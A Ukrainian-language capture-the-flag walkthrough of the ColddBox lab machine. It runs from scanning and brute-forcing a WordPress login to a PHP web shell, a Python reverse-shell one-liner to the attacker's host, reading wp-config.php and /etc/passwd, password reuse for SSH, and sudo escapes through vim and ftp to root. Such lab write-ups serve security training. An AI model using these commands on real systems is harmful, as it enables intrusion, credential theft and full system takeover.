# C0lddBox

Розвідка мережі.

```
ip a
```

```
fping -asgq 192.168.88.0/24
```

![](Screenshot_2026-07-24_10-48-17.png)

Повне сканування портів.

```
sudo nmap -sS 192.168.88.89 -p-
```

![](Screenshot_2026-07-24_11-03-03.png)

Відкриті 80 (http) і 4512 (unknown). Деталізуємо сервіси і версії.

```
sudo nmap -sCV -A -O -p80,4512 192.168.88.89 -T5
```

![](Screenshot_2026-07-24_11-03-12.png)

На 80-му порту маємо WordPress 4.1.31.

![](Screenshot_2026-07-24_11-01-24.png)

Сканування WordPress: вразливі плагіни/теми, юзери.

```
wpscan --url http://192.168.88.89 -e vp,vt,u --api-token <REDACTED>
```

![](Screenshot_2026-07-24_11-05-22.png)

![](Screenshot_2026-07-24_11-05-33.png)

![](Screenshot_2026-07-24_11-05-42.png)

Знайдені юзери: c0ldd, hugo, philip.

![](Screenshot_2026-07-24_11-05-50.png)

Брутфорс пароля для c0ldd.

```
wpscan --url http://192.168.88.89 --password-attack wp-login -U c0ldd -P /usr/share/wordlists/rockyou.txt -t 1 --throttle 100
```

![](Screenshot_2026-07-24_11-15-13.png)

Пароль знайдено: c0ldd / 9876543210. Логін в адмінку.

![](Screenshot_2026-07-24_11-15-52.png)

c0ldd — Administrator, hugo/philip — Editor.

![](Screenshot_2026-07-24_11-16-05.png)

Через адмінку заливаємо PHP шелл.

![](Screenshot_2026-07-24_11-16-40.png)

```
cat shell.php
<?php system($_GET[cmd]); ?>
```

![](Screenshot_2026-07-24_11-17-13.png)

![](Screenshot_2026-07-24_11-17-38.png)

```
http://192.168.88.89/wp-content/uploads/2026/07/shell.php?cmd=id
```

RCE підтверджено.

![](Screenshot_2026-07-24_11-17-51.png)

![](Screenshot_2026-07-24_11-18-16.png)

![](Screenshot_2026-07-24_11-18-46.png)

Піднімаємо повноцінний reverse shell.

```
nc -lvnp 9001
```

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.88.87",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

![](Screenshot_2026-07-24_11-19-33.png)

![](Screenshot_2026-07-24_11-19-51.png)

Стабілізація шелла.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](Screenshot_2026-07-24_11-20-28.png)

Пошук кредів у конфігу WordPress.

```
cat wp-config.php
```

![](Screenshot_2026-07-24_11-22-07.png)

Перевірка локальних юзерів системи.

```
cat /etc/passwd
```

![](Screenshot_2026-07-24_11-22-47.png)

Той самий пароль підходить для локального юзера c0ldd.

```
su c0ldd
```

![](Screenshot_2026-07-24_11-23-38.png)

Заходимо по SSH напряму.

```
ssh c0ldd@192.168.88.89 -p 4512
```

![](Screenshot_2026-07-24_11-24-27.png)

```
cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

![](Screenshot_2026-07-24_11-26-47.png)

`Congratulations, first level completed!`

Перевіряємо sudo права для privesc.

```
sudo -l
```

![](Screenshot_2026-07-24_11-25-08.png)

![](Screenshot_2026-07-24_11-29-56.png)

```
sudo vim -c ':!/bin/sh'
```

![](Screenshot_2026-07-24_11-31-58.png)

```
sudo ftp
ftp> !/bin/sh
```

![](Screenshot_2026-07-24_11-33-46.png)

```
sudo chmod 777 /root -R
```

![](Screenshot_2026-07-24_11-35-41.png)

```
cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

![](Screenshot_2026-07-24_11-36-41.png)

`Congratulations, machine completed!`
